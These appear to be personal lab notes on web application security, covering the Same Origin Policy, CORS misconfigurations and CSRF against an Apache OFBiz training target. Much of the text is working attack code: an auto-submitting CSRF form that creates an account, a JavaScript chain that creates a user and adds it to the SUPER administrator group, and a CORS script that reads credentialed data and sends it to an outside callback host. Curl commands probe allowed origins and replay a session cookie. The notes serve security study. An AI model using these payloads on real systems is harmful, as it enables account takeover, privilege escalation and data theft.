### Same Origin Policy 
SOP blocks JavaScript and our browsers from accessing cross-origin resources, but it does not block the outgoing requests for such resources、

if the cookie has SameSite=Lax, the browser will not send it even if the preflight request indicates that the destination server allows credentials on CORS requests.
```
URL	RESULT	REASON
https://foo.com/myInfo	Allowed	Same Origin
http://foo.com/users.json	Blocked	Different Scheme and Port
https://api.foo.com/info	Blocked	Different Domain
https://foo.com**:8443**/files	Blocked	Different Port
https://bar.com/analytics.js	Blocked	Different Domain
```
### curl requesting cors settings
```
curl -v -X OPTIONS http://192.168.154.155/exercise2
```
### Servers can set several headers1 to enable CORS
···
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: https://offensive-security.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: X-UserId
···
### CSRF(local test require apache2 service)
burp traffic of add user 
```
POST /webtools/control/createUserLogin HTTP/1.1
Host: ofbiz:8443
Connection: close
Content-Length: 178
Cache-Control: max-age=0
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://ofbiz:8443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ofbiz:8443/webtools/control/createnewlogin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=76A7BCC53C2B9BF49B21F99D2D8CA5D5.jvm1; OFBiz.Visitor=10000

enabled=&partyId=&userLoginId=test&currentPassword=password&currentPasswordVerify=password&passwordHint=&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=
```
Create html payload ofbiz.html
```
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
  <input type="hidden" name="enabled">
  <input type="hidden" name="partyId">
  <input type="hidden" name="userLoginId" value="test">
  <input type="hidden" name="currentPassword" value="password">
  <input type="hidden" name="currentPasswordVerify" value="password">
  <input type="hidden" name="passwordHint">
  <input type="hidden" name="requirePasswordChange" value="N">
  <input type="hidden" name="externalAuthId">
  <input type="hidden" name="securityQuestion">
  <input type="hidden" name="securityAnswer">
  </form>
</body>
</html>
```
Use js to make request
```
<html>
<head>
<script>
  var username = "csrftest2";
  var password = "password";
  var host = "https://ofbiz:8443";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  var admin_params = "userLoginId=" +username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";
  function send_create() { 
  console.log("Creating user..."); 
  fetch(host+create_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response) {
    send_admin();
  }); 
}

function send_admin() { 
  console.log("Adding admin role..."); 
  fetch(host+admin_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded' 
    },
    body : admin_params }
  ).then(
    console.log("Should be done...") 
  );
}

send_create();
</script>
</head>
<body></body>
</html>
```
### Trusting any domain 
```
<html>
<head>
<script>
var url = "https://cors-sandbox/exercise1";
function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    Cookie: 'SessionCookie=1123581321345589144',
    credentials: 'include',
    Origin: 'hellocors'
  })
  .then(response => response.json())
  .then(data => {
    fetch('http://192.168.45.242/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors'
    });
    console.log(data);
  });
}
get_code();
</script>
</head>
<body></body>
</html>
```
### Improper domain allow list
finding the allowed domain
![image](https://github.com/KiritoLoveAsuna/WebApplicationSecurity/assets/38044499/882aaba3-c6b4-472c-9c3b-32efb60803b8)
![image](https://github.com/KiritoLoveAsuna/WebApplicationSecurity/assets/38044499/ba46f78b-79d8-4cc5-b6d0-8d10ff7ef7bc)
```
curl -X "OPTIONS" -i -k https://cors-sandbox/allowlist
curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.com" -k https://cors-sandbox/allowlist
```
get the cookie
```
chrome access https://cors-sandbox/
dev tools - > network - cookies
```
get the flag 
```
curl -X "GET" -v -k -H "Origin: https://www.offensive-security.com" -H "Cookie: SessionCookie=1123581321345589144" https://cors-sandbox/exercise2
```
